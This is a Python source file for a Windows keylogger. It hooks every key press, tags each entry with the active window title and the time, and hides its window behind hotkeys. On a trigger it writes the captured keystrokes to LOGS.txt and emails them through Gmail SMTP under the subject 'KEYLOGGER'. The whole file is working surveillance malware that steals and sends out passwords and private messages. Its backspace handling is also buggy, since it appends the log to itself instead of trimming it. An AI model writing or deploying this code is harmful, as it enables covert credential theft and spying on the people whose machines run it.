from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import keyboard
import smtplib
from datetime import datetime
from win32gui import GetWindowText, GetForegroundWindow
import tkinter as tk
import tkinter.scrolledtext as scrolledtext

EMAIL_ADDRESS = "email address"
EMAIL_PASSWORD = "email password"

fileName = "LOGS.txt"
log_with_special_keys = ""


def send_email(email, password):
    text = "The logs are attached"
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    server.starttls()
    server.login(email, password)

    message = MIMEMultipart()
    with open(fileName, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {fileName}",
    )
    message['From'] = email
    message['To'] = email
    message['Subject'] = "KEYLOGGER"
    message.attach(MIMEText(text, 'plain'))
    message.attach(part)
    server.send_message(message)
    server.quit()


def special_char_name(character):
    if character == '\n':
        return "ENTER"
    elif character == '\t':
        return "TAB"
    elif character == " ":
        return "SPACE"
    else:
        return character


def report_to_file(fileName):
    global log_with_special_keys
    with open(fileName, "w") as file:
        file.write(log_with_special_keys)


class Keylogger:
    def __init__(self, window):
        self.window = window
        self.active_window = GetWindowText(GetForegroundWindow())
        self.date = str(datetime.now())[:-7].replace(" ", "-")
        self.log_without_special_keys = f"\n[{self.active_window} - {self.date}]\n"
        global log_with_special_keys
        log_with_special_keys = f"\n[{self.active_window} - {self.date}]\n"

        keyboard.on_press(callback=self.callback)
        keyboard.add_hotkey("ctrl+alt", callback=self.window.switch)
        keyboard.add_hotkey("ctrl+shift+alt+enter", callback=self.report)

    def callback(self, event):
        if self.active_window != GetWindowText(GetForegroundWindow()):
            self.date = str(datetime.now())[:-7].replace(" ", "-")
            self.active_window = GetWindowText(GetForegroundWindow())
            self.log_without_special_keys += f"\n[{self.active_window} - {self.date}]\n"
            global log_with_special_keys
            log_with_special_keys += f"\n[{self.active_window} - {self.date}]\n"

        self.valid_key(event.name)

    def valid_key(self, key):
        global log_with_special_keys
        if len(key) > 1:
            if key == "space":
                self.log_without_special_keys += " "
                log_with_special_keys += f"[{key.upper()}] "
            elif key == "enter":
                self.log_without_special_keys += "\n"
                log_with_special_keys += f"[{key.upper()}]\n"
            elif key == "tab":
                self.log_without_special_keys += "\t"
                log_with_special_keys += f"[{key.upper()}]\t"
            elif key == "backspace":
                log_with_special_keys += f"[{key.upper()} - ({special_char_name(self.log_without_special_keys[-1])})]"
                self.log_without_special_keys += self.log_without_special_keys[:-1]
            else:
                log_with_special_keys += f"[{key.upper()}]"
                self.log_without_special_keys += f"[{key.upper()}]"
        else:
            self.log_without_special_keys += key
            log_with_special_keys += key

    def report(self):
        global log_with_special_keys
        if log_with_special_keys:
            report_to_file(fileName)
            send_email(EMAIL_ADDRESS, EMAIL_PASSWORD)
        log_with_special_keys = ""
        self.log_without_special_keys = ""


class Window(tk.Tk):
    def __init__(self):
        super(Window, self).__init__()
        self.withdraw()
        self.text = scrolledtext.ScrolledText(self, width=80, height=20, wrap='word')
        self.text.pack()
        self.title("Keylogger")

    def set_text(self, text):
        self.text.delete(1.0, tk.END)
        self.text.insert(tk.END, text)

    def switch(self):
        if self.state() == "normal":
            self.withdraw()
        else:
            global log_with_special_keys
            self.set_text(log_with_special_keys)
            self.deiconify()


if __name__ == "__main__":
    window = Window()
    keylogger = Keylogger(window)
    window.mainloop()
